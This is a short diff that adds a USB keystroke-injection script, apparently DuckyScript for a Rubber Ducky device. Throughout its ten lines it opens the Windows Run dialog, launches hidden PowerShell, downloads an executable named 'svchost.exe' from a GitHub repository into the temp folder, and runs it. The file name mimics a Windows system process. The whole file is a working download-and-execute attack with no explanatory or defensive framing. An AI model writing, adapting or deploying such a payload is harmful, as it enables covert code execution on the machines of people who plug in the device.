@@ -1,0 +1,10 @@
+DELAY 750
+GUI r
+DELAY 2000
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/bootywarrior111/i-want-to-explora-da-booty/raw/master/svchost.exe', '%temp%/svchost.exe'); %temp%/svchost.exe
+ENTER
+DELAY 2000
+GUI r
+DELAY 2000
+STRING powershell %temp%/svchost.exe
+ENTER
